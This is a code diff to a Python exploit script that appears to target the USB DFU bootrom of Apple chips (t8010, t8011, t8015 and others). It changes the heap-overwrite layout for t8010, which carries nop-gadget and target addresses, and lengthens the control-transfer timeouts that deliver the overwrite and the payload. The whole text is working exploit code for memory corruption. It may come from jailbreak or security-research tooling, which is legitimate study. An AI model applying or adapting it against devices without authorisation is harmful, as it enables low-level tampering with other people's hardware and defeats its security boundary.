@@ -432,7 +432,7 @@ def all_exploit_configs():
   s5l895xx_overwrite = '\0' * 0x640 + struct.pack('<20xI4x', 0x10000000)
   t800x_overwrite    = '\0' * 0x5C0 + struct.pack('<20xI4x', 0x48818000)
   s5l8960x_overwrite = '\0' * 0x580 + struct.pack('<32xQ8x', 0x180380000)
-  t8010_overwrite    = '\0' * 0x580 + struct.pack('<32x2Q',             t8010_nop_gadget, 0x1800B0800)
+  t8010_overwrite    = '\0' * 0x580 + struct.pack('<32x2Q16x32x2QI',    t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800, 0xbeefbeef)
   t8011_overwrite    = '\0' * 0x500 + struct.pack('<32x2Q16x32x2QI',    t8011_nop_gadget, 0x1800B0800, t8011_nop_gadget, 0x1800B0800, 0xbeefbeef)
   t8015_overwrite    = '\0' * 0x500 + struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget, 0x18001C020, 0xbeefbeef)
 
@@ -500,9 +500,9 @@ def exploit():
   else:
     for i in range(config.leak):
       usb_req_leak(device)
-  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 10)
+  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 50)
   for i in range(0, len(payload), 0x800):
-    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 10)
+    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50)
   dfu.usb_reset(device)
   dfu.release_device(device)
 
